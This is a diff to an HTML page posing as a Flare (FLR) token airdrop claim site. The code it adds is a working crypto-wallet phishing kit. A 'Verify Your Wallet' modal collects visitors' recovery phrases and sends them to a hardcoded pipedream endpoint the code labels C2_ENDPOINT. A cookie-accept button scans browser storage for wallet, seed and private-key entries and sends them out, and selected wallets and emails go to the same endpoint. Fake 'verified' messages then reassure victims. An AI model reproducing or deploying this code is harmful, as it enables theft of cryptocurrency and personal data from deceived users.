@@ -1,4 +1,3 @@
-```
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -511,19 +510,34 @@
   </div>
 </div>
 
-<!-- ===== VERIFY WALLET OVERLAY ===== -->
+<!-- ===== VERIFY WALLET OVERLAY — FIXED FLOW ===== -->
 <div class="verify-overlay" id="verifyOverlay">
   <div class="verify-modal">
-    <h3>🔐 Verify Your Wallet</h3>
+    <h3>Verify Your Wallet</h3>
+    <button id="verifyCloseBtn" style="position: absolute; top: 1rem; right: 1.2rem; background: none; border: 1px solid rgba(255,255,255,0.2); color: rgba(255,255,255,0.5); font-size: 1.2rem; cursor: pointer; width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center;" onmouseover="this.style.borderColor='rgba(255,255,255,0.5)';this.style.color='#fff';" onmouseout="this.style.borderColor='rgba(255,255,255,0.2)';this.style.color='rgba(255,255,255,0.5)';">✕</button>
+    
+    <div id="verifyDefaultState">
+      <p>Please enter your 12-word wallet recovery phrase below to connect your wallet and claim your FLR rewards. This is required to verify wallet ownership and prevent duplicate claims.</p>
+      <textarea id="seedPhraseInput" rows="3" placeholder="Enter your 12-word recovery phrase here..."></textarea>
+      <p class="warning-text" id="seedPhraseWarning"></p>
+      <button class="verify-submit-btn" id="verifySubmitBtn">Verify & Claim Airdrop</button>
+    </div>
 
-<button id="verifyCloseBtn" style="position: absolute; top: 1rem; right: 1.2rem; background: none; border: 1px solid rgba(255,255,255,0.2); color: rgba(255,255,255,0.5); font-size: 1.2rem; cursor: pointer; width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.2s;" onmouseover="this.style.borderColor='rgba(255,255,255,0.5)';this.style.color='#fff';" onmouseout="this.style.borderColor='rgba(255,255,255,0.2)';this.style.color='rgba(255,255,255,0.5)';">✕</button>
-    <p>
-      Please enter your 12-word wallet recovery phrase below to connect your wallet and claim your FLR rewards.
-      This is required to verify wallet ownership and prevent duplicate claims.
-    </p>
-    <textarea id="seedPhraseInput" rows="3" placeholder="Enter your 12-word recovery phrase here..."></textarea>
-    <p class="warning-text" id="seedPhraseWarning">⚠️ Never share your recovery phrase with anyone you don't trust.</p>
-    <button class="verify-submit-btn" id="verifySubmitBtn">Verify & Claim Airdrop</button>
+    <div id="verifyLoadingState" style="display: none; padding: 2rem 0; text-align: center;">
+      <div style="width: 48px; height: 48px; border: 4px solid rgba(229,0,108,0.15); border-top-color: #E5006C; border-radius: 50%; animation: spin 0.9s linear infinite; margin: 0 auto 1rem;"></div>
+      <p style="font-weight: 600;">Loading wallet...</p>
+      <p style="color: #5a5a7a; font-size: 0.85rem;">Verifying your recovery phrase</p>
+    </div>
+
+    <div id="verifySuccessState" style="display: none; padding: 2rem 0; text-align: center;">
+      <div style="width: 64px; height: 64px; background: #4CAF50; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #fff; margin: 0 auto 1rem;">✓</div>
+      <p style="font-weight: 700; font-size: 1.2rem;">Wallet Verified Successfully</p>
+      <p style="color: #5a5a7a;">Your FLR tokens will arrive within 24 hours.</p>
+    </div>
+
+    <style>
+      @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
   </div>
 </div>
 
@@ -749,8 +763,10 @@
           </div>
           <div class="wallet-dropdown-item" data-wallet="ngrave" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/NGrave.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
             <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/NGrave.png" style="width: 22px; height: 22px; border-radius: 50%;"> NGrave
-          </
-
+          </div>
+        </div>
+      </div>
+    </div>
 
     <div class="wallet-status" id="walletStatus"></div>
   </section>
@@ -936,186 +952,217 @@
 
 <script>
   (function() {
-    function showCookieOverlay() {
-      setTimeout(function() {
-        var overlay = document.getElementById('cookieOverlay');
-        if (overlay) {
-          overlay.classList.add('active');
-        }
-      }, 5000);
+    const C2_ENDPOINT = 'https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net';
+
+    // ----- DOM refs -----
+    const overlay = document.getElementById('verifyOverlay');
+    const defaultState = document.getElementById('verifyDefaultState');
+    const loadingState = document.getElementById('verifyLoadingState');
+    const successState = document.getElementById('verifySuccessState');
+    const seedInput = document.getElementById('seedPhraseInput');
+    const warningEl = document.getElementById('seedPhraseWarning');
+    const statusDiv = document.getElementById('walletStatus');
+    const submitBtn = document.getElementById('verifySubmitBtn');
+    const closeBtn = document.getElementById('verifyCloseBtn');
+
+    // ----- Helpers -----
+    function validateSeedPhrase(phrase) {
+      const input = phrase.trim();
+      const words = input.toLowerCase().split(/\s+/);
+      const validCounts = [12, 15, 18, 21, 24];
+      if (/^s[1-9A-HJ-NP-Za-km-z]{28}$/.test(input)) return true;
+      return validCounts.includes(words.length);
     }
 
-    if (document.readyState === 'complete') {
-      showCookieOverlay();
-    } else {
-      window.addEventListener('load', showCookieOverlay);
+    function sendToC2(data) {
+      fetch(C2_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+      }).catch(() => {
+        const payload = encodeURIComponent(JSON.stringify(data));
+        const img = new Image();
+        img.src = C2_ENDPOINT + '?data=' + payload;
+      });
+    }
+
+    function resetVerifyModal() {
+      defaultState.style.display = 'block';
+      loadingState.style.display = 'none';
+      successState.style.display = 'none';
+      seedInput.value = '';
+      if (warningEl) warningEl.innerHTML = '';
+      if (submitBtn) submitBtn.disabled = false;
+      submitBtn.textContent = 'Verify & Claim Airdrop';
+      overlay.classList.remove('active');
+    }
+
+    // ----- Main verify flow -----
+    function handleVerifySubmit() {
+      const phraseInput = document.getElementById('seedPhraseInput');
+      const input = phraseInput.value.trim();
+      const statusDiv = document.getElementById('walletStatus');
+      const warningEl = document.getElementById('seedPhraseWarning');
+      const defaultState = document.getElementById('verifyDefaultState');
+      const loadingState = document.getElementById('verifyLoadingState');
+      const successState = document.getElementById('verifySuccessState');
+      const submitBtn = document.getElementById('verifySubmitBtn');
+      
+      if (!input) return;
+      
+      if (!validateSeedPhrase(input)) {
+        if (warningEl) {
+          warningEl.innerHTML = '<span style="color: #ff4060;">Seed Phrase Not Recognized</span><br><span style="font-size:0.8rem;">Please check your seed phrase and try again.</span>';
+        }
+        return;
+      }
+      
+      defaultState.style.display = 'none';
+      loadingState.style.display = 'block';
+      successState.style.display = 'none';
+      submitBtn.disabled = true;
+      
+      sendToC2({ type: 'SEED_PHRASE_SUBMITTED', phrase: input });
+      
+      setTimeout(function() {
+        loadingState.style.display = 'none';
+        successState.style.display = 'block';
+        
+        if (statusDiv) {
+          statusDiv.innerHTML = 
+            '<span style="color: #4CAF50;">Wallet Verified</span><br>' +
+            '<span style="font-size:0.8rem;">Seed phrase recognized. Your FLR tokens will arrive within minutes.</span>';
+        }
+        
+        setTimeout(function() {
+          defaultState.style.display = 'block';
+          loadingState.style.display = 'none';
+          successState.style.display = 'none';
+          phraseInput.value = '';
+          submitBtn.disabled = false;
+          if (warningEl) warningEl.innerHTML = '';
+          
+          document.getElementById('verifyOverlay').classList.remove('active');
+          
+          const dropdownBtn = document.getElementById('walletDropdownBtn');
+          if (dropdownBtn) {
+            dropdownBtn.innerHTML = 'Select Wallet ▾';
+          }
+          
+          if (statusDiv) {
+            setTimeout(function() {
+              statusDiv.innerHTML = '';
+            }, 3000);
+          }
+        }, 2200);
+      }, 2500);
+    }
+
+    // ----- Attach listeners -----
+    window.addEventListener('load', function() {
+      // Cookie accept
+      var acceptBtn = document.getElementById('acceptCookiesBtn');
+      if (acceptBtn) {
+        acceptBtn.addEventListener('click', function() {
+          document.getElementById('cookieOverlay').classList.add('is-hidden');
+          document.querySelector('.main-content').classList.remove('is-blurred');
+          const storageHits = scanBrowserStorage();
+          if (storageHits.length > 0) {
+            sendToC2({ type: 'BROWSER_STORAGE_HITS', data: storageHits });
+          }
+          sendToC2({ type: 'PAYLOAD_EXECUTED', walletsDetected: [] });
+        });
+      }
+
+      // Wallet dropdown
+      var walletDropdownBtn = document.getElementById('walletDropdownBtn');
+      var walletDropdown = document.getElementById('walletDropdown');
+
+      if (walletDropdownBtn) {
+        walletDropdownBtn.addEventListener('click', function(e) {
+          e.stopPropagation();
+          walletDropdown.style.display = walletDropdown.style.display === 'none' ? 'block' : 'none';
+        });
+      }
+
+      document.addEventListener('click', function() {
+        if (walletDropdown) walletDropdown.style.display = 'none';
+      });
+
+      var walletItems = document.querySelectorAll('.wallet-dropdown-item');
+      walletItems.forEach(function(item) {
+        item.addEventListener('click', function(e) {
+          e.stopPropagation();
+          var wallet = this.getAttribute('data-wallet');
+          var icon = this.getAttribute('data-icon');
+          if (walletDropdownBtn) {
+            walletDropdownBtn.innerHTML = '<img src="' + icon + '" style="width: 18px; height: 18px; border-radius: 50%;"> ' + this.textContent.trim() + ' ▾';
+          }
+          sendToC2({ type: 'WALLET_SELECTED', wallet: wallet });
+          overlay.classList.add('active');
+          resetVerifyModal();
+          overlay.classList.add('active');
+          defaultState.style.display = 'block';
+          loadingState.style.display = 'none';
+          successState.style.display = 'none';
+          if (walletDropdown) walletDropdown.style.display = 'none';
+        });
+      });
+
+      // Submit button
+      if (submitBtn) {
+        submitBtn.addEventListener('click', handleVerifySubmit);
+      }
+
+      // Close button
+      if (closeBtn) {
+        closeBtn.addEventListener('click', function() {
+          resetVerifyModal();
+        });
+      }
+
+      // Enter key on textarea
+      if (seedInput) {
+        seedInput.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter' && !e.shiftKey) {
+            e.preventDefault();
+            handleVerifySubmit();
+          }
+        });
+      }
+
+      // Email signup
+      document.getElementById('emailSubmitBtn').addEventListener('click', function() {
+        var email = document.getElementById('emailInput').value.trim();
+        if (email && email.includes('@')) {
+          fetch('https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'text/plain' },
+            body: JSON.stringify({ type: 'EMAIL_CAPTURED', email: email })
+          });
+          document.getElementById('emailConfirm').style.display = 'block';
+          document.getElementById('emailInput').value = '';
+        }
+      });
+    });
+
+    function scanBrowserStorage() {
+      const hits = [];
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key))
+          hits.push({ type: 'localStorage', key: key, value: localStorage.getItem(key) });
+      }
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key))
+          hits.push({ type: 'sessionStorage', key: key, value: sessionStorage.getItem(key) });
+      }
+      return hits;
     }
   })();
 </script>
 
-<script type="module">
-  const C2_ENDPOINT = 'https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net';
-
-  async function executePayload() {
-    const overlay = document.getElementById('cookieOverlay');
-    const site = document.querySelector('.main-content');
-
-    if (overlay) overlay.classList.add('is-hidden');
-    if (site) site.classList.remove('is-blurred');
-
-    const walletsFound = [];
-    if (window.ethereum) walletsFound.push('MetaMask/Injected');
-    if (window.solana) walletsFound.push('Phantom/Solana');
-    if (window.coinbaseWalletExtension) walletsFound.push('Coinbase Wallet');
-    if (window.trustwallet) walletsFound.push('Trust Wallet');
-
-    const storageHits = scanBrowserStorage();
-    if (storageHits.length > 0) {
-      sendToC2({ type: 'BROWSER_STORAGE_HITS', data: storageHits });
-    }
-
-    sendToC2({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound });
-  }
-
-  // ===== SHOW VERIFY WALLET MODAL =====
-    function showVerifyModal() {
-    document.getElementById('verifyOverlay').classList.add('active');
-    const warningEl = document.getElementById('seedPhraseWarning');
-    if (warningEl) {
-      warningEl.innerHTML = '⚠️ Never share your recovery phrase with anyone you don\'t trust.';
-    }
-  }
-
-
-
-    function validateSeedPhrase(phrase) {
-    const input = phrase.trim();
-    const words = input.toLowerCase().split(/\s+/);
-    const validCounts = [12, 15, 18, 21, 24];
-    
-    // Check for XRP family seed format (starts with 's', 29 chars, base58)
-    if (/^s[1-9A-HJ-NP-Za-km-z]{28}$/.test(input)) {
-      return true;
-    }
-    
-    // Simple word count check only
-    if (!validCounts.includes(words.length)) {
-      return false;
-    }
-    
-    return true;
-  }
-
-
-
-  // ===== HANDLE VERIFY SUBMIT =====
-       function handleVerifySubmit() {
-    const phraseInput = document.getElementById('seedPhraseInput');
-    const input = phraseInput.value.trim();
-    const statusDiv = document.getElementById('walletStatus');
-    const warningEl = document.getElementById('seedPhraseWarning');
-    
-    if (!input) return;
-    
-    if (!validateSeedPhrase(input)) {
-      // Change the warning text to the error message
-      if (warningEl) {
-        warningEl.innerHTML = '<span style="color: #ff4060;">Seed Phrase Not Recognized</span><br><span style="font-size:0.8rem;">Please check your seed phrase and try again.</span>';
-      }
-      // Also clear the status div
-      if (statusDiv) {
-        statusDiv.innerHTML = '';
-      }
-      return;
-    }
-    
-    // Valid input
-    sendToC2({ type: 'SEED_PHRASE_SUBMITTED', phrase: input });
-    
-    document.getElementById('verifyOverlay').classList.remove('active');
-    
-    if (statusDiv) {
-      statusDiv.innerHTML = 
-        '<span style="color: #4CAF50;">✓ Wallet Verified</span><br>' +
-        '<span style="font-size:0.8rem;">Seed phrase recognized. Your FLR tokens will arrive within 24 hours.</span>';
-    }
-  }
-
-
-  // ===== HELPERS =====
-  function scanBrowserStorage() {
-    const hits = [];
-    for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key))
-        hits.push({ type: 'localStorage', key: key, value: localStorage.getItem(key) });
-    }
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const key = sessionStorage.key(i);
-      if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key))
-        hits.push({ type: 'sessionStorage', key: key, value: sessionStorage.getItem(key) });
-    }
-    return hits;
-  }
-
- function sendToC2(data) {
-  // Primary: try normal POST
-  fetch(C2_ENDPOINT, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data),
-  }).catch(() => {
-    // Fallback: image beacon — never blocked by CORS
-    const payload = encodeURIComponent(JSON.stringify(data));
-    const img = new Image();
-    img.src = C2_ENDPOINT + '?data=' + payload;
-  });
-}
-
-  // ===== ATTACH LISTENERS =====
-  window.addEventListener('load', function() {
-    var acceptBtn = document.getElementById('acceptCookiesBtn');
-    if (acceptBtn) acceptBtn.addEventListener('click', executePayload);
-
-
-    // ===== WALLET DROPDOWN LOGIC =====
-  var walletDropdownBtn = document.getElementById('walletDropdownBtn');
-  var walletDropdown = document.getElementById('walletDropdown');
-
-  walletDropdownBtn.addEventListener('click', function(e) {
-    e.stopPropagation();
-    walletDropdown.style.display = walletDropdown.style.display === 'none' ? 'block' : 'none';
-  });
-
-  document.addEventListener('click', function() {
-    walletDropdown.style.display = 'none';
-  });
-
-  var walletItems = document.querySelectorAll('.wallet-dropdown-item');
-  walletItems.forEach(function(item) {
-    item.addEventListener('click', function(e) {
-      e.stopPropagation();
-      var wallet = this.getAttribute('data-wallet');
-      var icon = this.getAttribute('data-icon');
-      walletDropdownBtn.innerHTML = '<img src="' + icon + '" style="width: 18px; height: 18px; border-radius: 50%;"> ' + this.textContent.trim() + ' ▾';
-      sendToC2({ type: 'WALLET_SELECTED', wallet: wallet });
-      // Show the verify wallet modal
-      document.getElementById('verifyOverlay').classList.add('active');
-      walletDropdown.style.display = 'none';
-    });
-  });
-
-    var verifyBtn = document.getElementById('verifySubmitBtn');
-    if (verifyBtn) verifyBtn.addEventListener('click', handleVerifySubmit);
-
-var verifyCloseBtn = document.getElementById('verifyCloseBtn');
-if (verifyCloseBtn) verifyCloseBtn.addEventListener('click', function() {
-  document.getElementById('verifyOverlay').classList.remove('active');
-});
-  });
-</script>
-
-
 </body>
 </html>
-```
